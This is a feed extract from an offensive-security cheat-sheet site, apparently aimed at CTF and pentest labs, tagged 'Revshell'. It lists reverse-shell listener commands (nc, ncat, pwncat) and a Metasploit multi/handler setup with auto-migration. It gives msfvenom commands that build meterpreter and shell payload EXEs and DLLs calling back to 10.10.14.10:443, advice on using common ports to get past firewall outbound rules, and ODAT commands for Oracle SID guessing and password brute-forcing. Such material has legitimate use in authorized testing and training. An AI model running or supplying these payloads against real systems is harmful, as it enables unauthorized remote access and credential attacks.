channel.title: Revshell on TLDRBins
channel.description: Recent content in Revshell on TLDRBins

item.title: Listeners
item.description: nc rlwrap nc -lvnp 1337 ncat # Default listening on both ipv4 and ipv6 rlwrap ncat -lvnp 1337 pwncat Download pwncat pwncat-cs -lp 1337 # After getting a connection (local) pwncat$ back

item.title: Metasploit Listener
item.description: Start a Metasploit Listener msfconsole -q use exploit/multi/handler set payload windows/meterpreter/reverse_tcp set lhost 10.10.14.10 set lport 443 run Note: Try to use common ports such as 53, 80, 443 to bypass firewall outbound rules If the shell die immediately, we can try to migrate it to another process # Create a automigrate.rc script run post/windows/manage/migrate msfconsole -q use exploit/multi/handler set payload windows/meterpreter/reverse_tcp set lhost 10.10.14.10 set lport 443 set AutoRunScript multi_console_command -r automigrate.

item.title: Metasploit Shellcode
item.description: Generate Metasploit Shellcode Windows x64 EXE msfvenom -p windows/x64/meterpreter/reverse_tcp -a x64 -f exe --platform windows LHOST=10.10.14.10 LPORT=443 > rev.exe Windows x86 EXE # Staged msfvenom -p windows/meterpreter/reverse_tcp -a x86 -f exe --platform windows LHOST=10.10.14.10 LPORT=443 > rev.exe # Stageless msfvenom -p windows/shell_reverse_tcp -a x86 -f exe --platform windows LHOST=10.10.14.10 LPORT=443 EXITFUNC=thread > rev.exe Windows x64 DLL msfvenom -p windows/x64/meterpreter/reverse_tcp -a x64 -f dll --platform windows LHOST=10.10.14.10 LPORT=443 > rev.dll Note: These will be flagged by AV Note: Try to use common ports such as 53, 80, 443 to bypass firewall outbound rules

item.title: Oracle Database
item.description: Tools sqlplus # Install sudo apt install oracle-instantclient-sqlplus # export LD_LIBRARY_PATH export LD_LIBRARY_PATH=/usr/lib/oracle/19.6/client64/lib${LD_LIBRARY_PATH:+:$LD_LIBRARY_PATH} # Check sqlplus -V ODAT (Oracle Database Attacking Tool) Download ODAT # Install sudo apt install odat # Check odat --version Enum # SID enum (You only need one) odat sidguesser -s 10.10.11.10 # User/Password brute force odat passwordguesser -s 10.10.11.10 -d <SID> --accounts-file accounts.txt # Run all checks with creds as sysdba odat all -s 10.
